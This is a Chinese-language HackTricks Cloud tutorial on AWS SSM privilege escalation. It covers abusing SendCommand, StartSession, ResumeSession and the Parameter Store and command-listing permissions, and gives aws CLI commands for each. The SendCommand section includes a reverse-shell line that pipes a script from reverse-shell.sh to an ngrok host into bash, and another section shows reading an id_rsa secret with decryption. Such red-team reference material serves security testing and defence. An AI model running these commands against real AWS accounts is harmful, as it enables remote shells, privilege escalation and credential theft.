# AWS - SSM Privesc

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

## SSM

有关 SSM 的更多信息，请查看：

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `ssm:SendCommand`

具有权限 **`ssm:SendCommand`** 的攻击者可以 **在运行 Amazon SSM Agent 的实例中执行命令** 并 **危害其中运行的 IAM 角色**。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"
```
在您使用此技术在已被攻陷的 EC2 实例中提升权限的情况下，您可以通过以下方式在本地捕获 rev shell：
```bash
# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**潜在影响：** 直接提升权限到附加在运行实例上的 EC2 IAM 角色，这些实例运行着 SSM Agents。

### `ssm:StartSession`

拥有权限 **`ssm:StartSession`** 的攻击者可以 **在运行 Amazon SSM Agent 的实例中启动类似 SSH 的会话**，并 **危害其中运行的 IAM 角色**。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
{% hint style="danger" %}
要开始会话，您需要安装 **SessionManagerPlugin**: [https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html)
{% endhint %}

**潜在影响：** 直接提升权限到附加到运行实例的 EC2 IAM 角色，这些实例运行着 SSM 代理。

#### 提升权限到 ECS

当 **ECS 任务** 以 **`ExecuteCommand` 启用** 运行时，具有足够权限的用户可以使用 `ecs execute-command` 在容器内 **执行命令**。\
根据 [**文档**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/)，这是通过在您用来发起“_exec_”命令的设备与目标容器之间创建安全通道来完成的，使用 SSM 会话管理器。（需要 SSM 会话管理器插件才能使其工作）\
因此，具有 `ssm:StartSession` 权限的用户将能够通过运行以下命令 **在启用该选项的 ECS 任务中获取 shell**：
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../.gitbook/assets/image (185).png>)

**潜在影响：** 直接提升权限到附加到运行任务的 `ECS` IAM 角色，且启用了 `ExecuteCommand`。

### `ssm:ResumeSession`

拥有权限 **`ssm:ResumeSession`** 的攻击者可以在运行 Amazon SSM Agent 的实例中重新**启动 SSH 类会话**，并在**断开**的 SSM 会话状态下**危害其中运行的 IAM 角色**。
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**潜在影响：** 直接提升权限到附加到运行实例的 EC2 IAM 角色，这些实例运行着 SSM Agents 并且有断开的会话。

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

拥有上述权限的攻击者将能够列出 **SSM 参数** 并 **以明文读取**。在这些参数中，您经常可以 **找到敏感信息**，例如 SSH 密钥或 API 密钥。
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**潜在影响：** 在参数中找到敏感信息。

### `ssm:ListCommands`

拥有此权限的攻击者可以列出所有发送的 **命令**，并希望在其中找到 **敏感信息**。
```
aws ssm list-commands
```
**潜在影响：** 在命令行中查找敏感信息。

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

拥有这些权限的攻击者可以列出所有发送的 **命令** 并 **读取生成的输出**，希望能找到 **敏感信息**。
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**潜在影响：** 在命令行输出中查找敏感信息。

### Codebuild

您还可以使用 SSM 进入正在构建的 codebuild 项目：

{% content-ref url="aws-codebuild-privesc.md" %}
[aws-codebuild-privesc.md](aws-codebuild-privesc.md)
{% endcontent-ref %}

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}
